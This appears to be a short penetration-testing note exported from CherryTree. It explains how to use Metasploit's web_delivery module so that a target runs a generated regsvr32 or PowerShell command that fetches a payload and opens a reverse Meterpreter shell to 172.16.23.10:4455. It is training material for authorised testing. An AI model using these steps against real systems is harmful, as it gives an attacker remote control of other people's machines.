<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Upgrade to meterpreter shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Upgrade to meterpreter shell</h1><br/><br /><br />1. Generate payload and listen for a connection<br /><div class="codebox"><pre>msfconsole<br />use exploit<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>script<span style="color:#ff9d00;font-weight:700">/</span>web_delivery<br /><span style="color:#ff9d00;font-weight:700">set</span> target 3        <span style="color:#0088ff;font-weight:400">#use the regsvr32 (Register Server) command-line utility</span><br /><span style="color:#ff9d00;font-weight:700">set</span> srvhost 172.16.23.10<br /><span style="color:#ff9d00;font-weight:700">set</span> lhost 172.16.23.10<br /><span style="color:#ff9d00;font-weight:700">set</span> lport 4455      <span style="color:#0088ff;font-weight:400">#listening of the meterpreter shell</span><br /><span style="color:#ff9d00;font-weight:700">set</span> ExitOnSession <span style="color:#ff9d00;font-weight:700">false</span>    <span style="color:#0088ff;font-weight:400">#listening mode even if a closed meterpreter connection occurs</span><br />run -j</pre></div><br />    <a href=""><img src="images/2117-1.png" alt="images/2117-1.png" /></a><br />    <br /><br />2. Run the command generated on the target system<br />    <a href=""><img src="images/2117-2.png" alt="images/2117-2.png" /></a><br />    To get a meterpreter shell back wait 3-4 minutes<br />    <a href=""><img src="images/2117-3.png" alt="images/2117-3.png" /></a><br /><br /><br /><br /><br /><strong>Set different Type of Targets</strong><br /><a href=""><img src="images/2117-4.png" alt="images/2117-4.png" /></a><br />• Windows<br />   ◇ By setting “target 3” will be generated a command for the regsvr32 (Register Server) command-line utility<br />   ◇ By setting “target 2” a powershell command that we will need to execute on the Windows host (also on a cmd shell)<br />       <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> target 2</pre></div><br />• Linux<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">set</span> target 7</pre></div><br /><br /><br /><br /><br /><br /><br />Bibliography:<br /><a href="https://www.offensive-security.com/metasploit-unleashed/web-delivery/">https://www.offensive-security.com/metasploit-unleashed/web-delivery/</a></div>
</body>
</html>
